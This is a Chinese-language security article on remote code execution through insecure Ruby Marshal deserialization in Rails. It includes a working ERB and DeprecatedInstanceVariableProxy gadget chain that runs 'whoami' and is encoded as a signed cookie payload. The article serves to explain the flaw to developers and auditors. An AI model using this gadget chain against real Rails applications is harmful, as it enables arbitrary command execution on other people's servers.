# 前言

Ruby on Rails 是一个广泛使用于 Web 应用程序开发的框架，它利用 cookie 来识别用户会话。每个 cookie 包含两部分：cookie-value 和签名。Rails 通过检查收到的 cookie 的哈希/签名是否与预期相符来验证该 cookie 是否被篡改。解码 cookie 的过程通常涉及以下三个步骤：
1. `url_decoded_cookie = CGI.unescape(cookie_value)`
2. `b64_decoded_session = Base64.decode64(url_decoded_cookie)`
3. `session = Marshal.load(b64_decoded_session)`

在对多个 Ruby on Rails 项目进行安全审计时，我们频繁地遇到因不安全地使用元组反序列化而导致的安全隐患。虽然会话 cookie 的反序列化问题已经很严重了，但更广泛的反序列化错误可能导致远程代码执行（RCE）。这些错误可能发生在处理 cookie、GET-POST 数据或任何类型用户输入数据的过程中。例如：

```ruby
if (data = @cookies[:user_data]).present?
  user, info = Marshal.load(Base64.decode64(data))
end
```

上述代码展示了如何通过反序列化机制加载潜在恶意的数据，这极有可能导致任意代码执行。

# PoC 创建

创建概念验证（Proof of Concept, PoC）的第一步是利用 ERB 或 Erubis 这样的模板引擎。GitHub Enterprise 使用的就是这类解析器之一。`@src` 实例变量可以包含纯 Ruby 代码，因此我们可以插入我们的有效载荷，使其作为 Ruby 代码执行。

### ERB 示例

```ruby
erb = ERB.allocate
erb.instance_variable_set(:@src, "%x(system('whoami'))")
erb.result
```

这里的关键在于调用 `eval(@src, ...)` 方法，该方法将执行存储在 `@src` 中的字符串作为 Ruby 代码。

### 强制调用结果方法

为了在反序列化过程中自动触发 `result` 方法，我们可以利用 `ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy` 类。这个类允许我们在对象属性访问时执行特定的操作。下面是一个示例配置：

```ruby
require 'active_support/deprecation/proxy'
erb = ERB.allocate
erb.instance_variable_set(:@src, "%x(system('whoami'))")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate
depr.instance_variable_set(:@instance, erb)
depr.instance_variable_set(:@method, :result)
depr.instance_variable_set(:@var, "@result")
depr.instance_variable_set(:@predecessor, ActiveSupport::Deprecation.new)
payload = Base64.encode64(Marshal.dump(depr)).gsub("\n", "")
```

# 加载 Payload

要测试此漏洞，请参阅 [repl.it](https://repl.it/@allyshka/Ruby-RCE-with-Marshalload) 上提供的代码平台。首先，根据上述说明构造 `DeprecatedInstanceVariableProxy` 对象。接着，编组会话变量，并使用给定的秘密密钥生成 HMAC 签名。最后，编码并发送带有签名的有效载荷作为 cookie 请求头。

# 结论

成功利用此类漏洞后，攻击者可以在目标系统上执行任意命令。鉴于其潜在影响范围之广，这种类型的错误往往会导致严重的生产环境问题。特别地，当应用程序以高权限运行时，后果尤为严重。务必保持警惕！

# 参考资料
- OWASP AppSecCali 2015 关于 marshalling 和 pickle 序列化的幻灯片 - Christopher Frohoff
- Rails 5.1.4 YAML 不安全反序列化 RCE 负载
- Ruby Marshal + Base64 RCE 负载游乐场/生成器
- GitHub Enterprise 2.8.0 相关漏洞
- GitHub Enterprise 4 链式漏洞，其中一个为不安全的 Marshal 反序列化